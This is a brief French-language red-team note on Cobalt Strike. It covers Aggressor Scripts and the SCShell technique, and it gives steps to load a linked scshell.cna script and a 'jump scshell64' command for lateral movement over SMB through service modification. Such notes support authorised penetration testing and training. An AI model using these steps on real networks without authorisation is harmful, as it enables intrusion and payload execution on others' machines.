

# Cobalt Strike

Possible d'utiliser des Agressor Scripts, utile dans le cas ou on doit simuler des TTPs spécifiques qui ne sont pas inclues dans Cobalt Srike.

## SCShell

Modifie temporairement un service existant et injecte un payload dedans.

https://github.com/Mr-Un1k0d3r/SCShell/blob/master/CS-BOF/scshell.cna


1. Charger le script dans Cobalt Strike -> Script Manager -> Load -> scshell.cna
2. latéralisation

```
jump scshell64 lon-ws-1 smb
```
